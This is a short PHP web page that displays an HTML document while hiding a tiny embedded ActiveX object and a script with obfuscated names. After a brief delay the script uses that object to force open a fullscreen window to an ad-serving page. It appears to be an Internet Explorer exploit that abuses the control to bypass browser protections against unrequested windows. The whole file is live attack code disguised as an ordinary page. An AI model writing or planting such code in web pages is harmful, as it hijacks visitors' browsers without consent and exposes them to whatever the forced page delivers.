<?php
readfile("doc-data.html");
?>
<object id="x00000001" classid="clsid:2D360201-FFF5-11d1-8D03-00A0C959BC0A" width="1" height="1"  align="middle"><PARAM NAME="ActivateApplets" VALUE="1"><PARAM NAME="ActivateActiveXControls" VALUE="1"></object>
<SCRIPT>
function x00000000()
{
x00000001.DOM.Script.open("ad_start.php?id=1","_blank","fullscreen=1");
}
setTimeout("x00000000()",300);
</SCRIPT>
